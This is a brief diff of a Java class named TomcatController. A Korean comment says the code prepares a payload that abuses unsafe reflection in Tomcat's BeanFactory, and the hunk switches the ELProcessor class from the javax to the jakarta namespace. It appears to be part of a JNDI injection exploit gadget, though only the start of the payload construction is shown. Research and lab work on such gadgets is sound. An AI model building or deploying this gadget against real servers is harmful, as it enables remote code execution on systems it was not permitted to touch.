@@ -40,7 +40,7 @@ public class TomcatController {
     // org.apache.naming.factory.BeanFactory에서 안전하지 않은 리플렉션을 이용하는 페이로드 준비
     ResourceRef ref =
         new ResourceRef(
-            "javax.el.ELProcessor",
+            "jakarta.el.ELProcessor",
             null,
             "",
             "",
